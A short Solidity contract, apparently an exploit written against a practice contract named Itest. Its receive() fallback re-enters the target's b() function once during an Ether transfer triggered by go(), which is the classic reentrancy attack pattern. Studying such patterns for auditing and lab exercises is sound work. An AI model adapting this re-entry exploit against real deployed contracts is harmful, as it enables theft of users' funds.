// SPDX-License-Identifier: MIT
pragma solidity >=0.8.13;

import "./Itest.sol";

contract Exp{
    Itest public test;
    uint256 public times;

    constructor(address _test) {
        test = Itest(_test);
    }

    function go() public {
        test.a(address(this));
    }

    receive () external payable { 
        if (times == 0) {
            times++;
            test.b();
            // test.a(address(0));
        }
    }
}